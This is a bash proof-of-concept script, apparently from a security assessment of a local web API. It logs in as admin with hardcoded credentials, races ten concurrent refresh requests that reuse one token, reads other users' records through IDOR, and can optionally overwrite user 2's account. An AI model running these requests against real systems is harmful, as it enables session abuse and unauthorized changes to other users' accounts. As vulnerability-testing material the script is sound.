#!/usr/bin/env bash
set -euo pipefail

BASE="${BASE:-http://localhost:8080}"

echo "[+] Target: $BASE"

echo "[+] Login as admin"
LOGIN_JSON=$(curl -s -X POST "$BASE/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"pass"}')
ACCESS=$(python3 -c 'import json,sys;print(json.loads(sys.argv[1])["accessToken"])' "$LOGIN_JSON")
R1=$(python3 -c 'import json,sys;print(json.loads(sys.argv[1])["refreshToken"])' "$LOGIN_JSON")
echo "    accessToken=REDACTED"
echo "    refreshToken(R1)=REDACTED"

echo "[+] Auth enforcement check"
curl -s -o /dev/null -w "    /me without token -> %{http_code}\n" "$BASE/me"
curl -s -o /dev/null -w "    /me with token -> %{http_code}\n" -H "Authorization: Bearer $ACCESS" "$BASE/me"

echo "[+] PoC: refresh rotation race (10 concurrent refresh using same R1)"
mkdir -p evidence
# Run 10 concurrent refresh requests
seq 1 10 | xargs -I{} -P10 bash -c '
  curl -s -o evidence/refresh_{}.json -w "%{http_code}\n" \
    -X POST "'"$BASE"'/refresh" \
    -H "Content-Type: application/json" \
    -d "{\"refreshToken\":\"'"$R1"'\"}" > evidence/refresh_{}.code
'

# Count success (200) across files
SUCCESS=$(cat evidence/refresh_*.code | grep -c "^200$" || true)
echo "    200 count = $SUCCESS (expected secure=1, vulnerable>=2)"

echo "[+] PoC: IDOR/BOLA read"
curl -s -i "$BASE/users" -H "Authorization: Bearer $ACCESS" | sed -n '1,10p'
curl -s -i "$BASE/users/2" -H "Authorization: Bearer $ACCESS" | sed -n '1,10p'

echo ""
echo "[!] Optional: IDOR write (disabled by default)."
echo "    To run: ENABLE_WRITE=1 BASE=$BASE bash scripts/poc.sh"
if [[ "${ENABLE_WRITE:-0}" == "1" ]]; then
  echo "[+] IDOR write: modify user 2"
  curl -s -i -X PUT "$BASE/users/2" \
    -H "Authorization: Bearer $ACCESS" \
    -H "Content-Type: application/json" \
    -d '{"username":"henry_pwned","password":"pass"}' | sed -n '1,15p'
fi

echo "[+] Done."
